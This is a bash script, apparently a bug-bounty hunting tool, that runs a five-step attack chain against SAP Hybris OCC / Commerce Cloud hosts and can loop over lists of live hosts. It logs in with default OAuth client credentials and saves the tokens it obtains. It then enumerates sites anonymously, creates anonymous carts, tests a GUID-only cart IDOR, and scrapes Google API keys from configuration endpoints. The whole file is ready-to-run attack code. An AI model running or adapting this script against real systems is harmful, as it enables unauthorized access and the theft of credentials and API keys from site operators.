#!/usr/bin/env bash
# hunt-hybris-occ.sh — SAP Hybris OCC / Commerce Cloud 完整攻擊鏈驗證
# 來源：SAP Hybris OCC pattern chain（research/target/*）
#
# 驗證：
#   F1: default OAuth creds (mobile_android:secret, client-side:secret, trusted_client:secret)
#   F2: baseSites 匿名枚舉 (/api/v2/basesites?fields=FULL)
#   F3: 跨 market 匿名 cart 建立 (/api/v2/{site}/users/anonymous/carts)
#   F4: GUID-only cart IDOR (無 ownership check)
#   F5: configParam/global unrestricted API keys (Google Maps/Vision/Firebase)
#
# 用法：
#   ./hunt-hybris-occ.sh <host-or-url>
#   ./hunt-hybris-occ.sh https://api-example.hashed-staging-s1-public.model-t.cc.commerce.ondemand.com
#   或從 BBOT live 列表批次：
#   cat recon/<target>/bbot/live_hosts.txt | while read h; do ./hunt-hybris-occ.sh "$h"; done
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host>"; exit 1; }
HOST="${HOST%/}"
OUT_DIR="${OUT_DIR:-./hybris_occ_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/$SLUG.txt"
: > "$OUT"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit() { echo "🔴 $*" | tee -a "$OUT"; }
ok()  { echo "   $*" >> "$OUT"; }

log "=== Hybris OCC hunt: $HOST ==="

# ── Probe: does the host look like Hybris at all? ──────────────
PROBE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
  "$HOST/authorizationserver/oauth/token")
if [[ ! "$PROBE" =~ ^(200|400|401|403|405)$ ]]; then
  log "not hybris (token endpoint $PROBE) — skip"
  exit 0
fi
ok "authorizationserver endpoint present: HTTP $PROBE"

# ── F1: default OAuth creds ───────────────────────────────────
TOKEN=""
for CRED in "mobile_android:secret" "client-side:secret" "trusted_client:secret" "mobile:secret"; do
  CID="${CRED%:*}"; CSEC="${CRED#*:}"
  RESP=$(curl -sk --max-time 8 -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSEC}" \
    "$HOST/authorizationserver/oauth/token")
  AT=$(echo "$RESP" | python3 -c "import json,sys
try: print(json.load(sys.stdin).get('access_token',''))
except: pass" 2>/dev/null)
  if [ -n "$AT" ]; then
    hit "F1 default OAuth creds: $CID:$CSEC → token acquired"
    TOKEN="$AT"
    echo "$AT" > "$OUT_DIR/${SLUG}_token_${CID}.txt"
    break
  fi
done

# ── F2: anonymous baseSites enumeration (no token needed) ──────
for BASE in "/api/v2/basesites" "/occ/v2/basesites" "/rest/v2/basesites"; do
  RESP=$(curl -sk --max-time 8 "$HOST${BASE}?fields=FULL")
  if echo "$RESP" | grep -q '"baseSites"'; then
    SITES=$(echo "$RESP" | python3 -c "import json,sys
try:
  d=json.load(sys.stdin)
  print(','.join(s.get('uid','') for s in d.get('baseSites',[])))
except: pass" 2>/dev/null)
    hit "F2 anonymous baseSites ($BASE): $SITES"
    echo "$RESP" > "$OUT_DIR/${SLUG}_basesites.json"
    FIRST_SITE=$(echo "$SITES" | cut -d, -f1)
    API_BASE="$BASE"
    break
  fi
done
[ -z "${FIRST_SITE:-}" ] && { log "no basesites → stop"; exit 0; }

# ── F3: anonymous cart create on each basesite ─────────────────
GUID_A=""
for SITE in $(echo "$SITES" | tr ',' ' '); do
  [ -z "$SITE" ] && continue
  CART=$(curl -sk --max-time 8 -X POST \
    ${TOKEN:+-H "Authorization: Bearer $TOKEN"} \
    "$HOST${API_BASE}/${SITE}/users/anonymous/carts")
  G=$(echo "$CART" | python3 -c "import json,sys
try: print(json.load(sys.stdin).get('guid',''))
except: pass" 2>/dev/null)
  if [ -n "$G" ]; then
    hit "F3 anonymous cart created on $SITE: guid=$G"
    [ -z "$GUID_A" ] && GUID_A="$G" && CART_SITE="$SITE"
  fi
done

# ── F4: GUID IDOR — read cart without ownership ───────────────
if [ -n "$GUID_A" ]; then
  READ_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
    "$HOST${API_BASE}/${CART_SITE}/users/anonymous/carts/${GUID_A}")
  [ "$READ_CODE" = "200" ] && hit "F4 GUID-only cart IDOR: $HOST${API_BASE}/${CART_SITE}/users/anonymous/carts/${GUID_A} → 200"
fi

# ── F5: configParam/global unrestricted API keys ──────────────
if [ -n "$TOKEN" ] && [ -n "${CART_SITE:-}" ]; then
  CONF=$(curl -sk --max-time 8 -H "Authorization: Bearer $TOKEN" \
    "$HOST${API_BASE}/${CART_SITE}/configParam/global?fields=FULL")
  if echo "$CONF" | grep -qE "AIza[0-9A-Za-z_-]{20,}"; then
    KEYS=$(echo "$CONF" | grep -oE "AIza[0-9A-Za-z_-]{20,}" | sort -u)
    hit "F5 Google API keys in configParam/global:"
    echo "$KEYS" | while read k; do ok "     $k"; done
    echo "$CONF" > "$OUT_DIR/${SLUG}_configparam.json"
  fi
fi

log "=== done → $OUT ==="
